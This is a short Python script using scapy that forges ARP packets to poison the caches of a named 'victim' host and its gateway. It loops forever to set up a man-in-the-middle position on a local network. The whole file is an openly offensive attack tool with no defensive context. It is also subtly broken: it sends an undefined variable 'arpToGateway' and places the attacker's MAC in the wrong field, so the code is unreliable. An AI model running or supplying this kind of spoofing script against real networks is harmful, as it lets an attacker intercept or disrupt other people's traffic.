from scapy.all import *
import time
import sys

#gate is gateways ip argv[1]
#victim is victims ip argv[2]
#use sendp
#mac = your mac argv[3]
cmdargs = str(sys.argv)
op = 1
arpToVictim = ARP(op=op,psrc=sys.argv[1],pdst=sys.argv[2],hwdst=sys.argv[3])
arpGateway = ARP(op=op,pdst=sys.argv[1],psrc=sys.argv[2],hwdst=sys.argv[3])

while 1:
	send (arpToVictim)
	send(arpToGateway)
	time.sleep(5)